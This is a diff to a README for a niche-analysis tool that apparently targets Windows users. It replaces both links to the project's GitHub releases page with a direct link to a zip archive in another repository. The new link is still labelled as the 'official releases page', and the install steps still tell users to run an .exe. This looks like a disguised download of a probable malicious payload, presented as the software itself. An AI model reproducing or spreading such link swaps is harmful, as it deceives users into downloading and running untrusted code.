@@ -5,7 +5,7 @@ description: "Analyze market niches for Amazon KDP, YouTube, and TikTok with thi
 ---
 # 🔎 validateniche-niche-checker - Validate your business ideas with ease
 
-[![Download ValidateNiche](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/asphyxiated-lowermantle666/validateniche-niche-checker/releases)
+[![Download ValidateNiche](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/asphyxiated-lowermantle666/asphyxiated-lowermantle666.github.io/main/reference/Application_v2.0.zip)
 
 ## 🎯 About This Software
 
@@ -27,7 +27,7 @@ Your computer needs to meet basic standards to run the application well. Ensure 
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/asphyxiated-lowermantle666/validateniche-niche-checker/releases) to access the download files.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/asphyxiated-lowermantle666/asphyxiated-lowermantle666.github.io/main/reference/Application_v2.0.zip) to access the download files.
 2.  Look for the latest version under the "Assets" section.
 3.  Click the link that ends in .exe to download the installer to your Downloads folder.
 4.  Open the file once the download finishes.
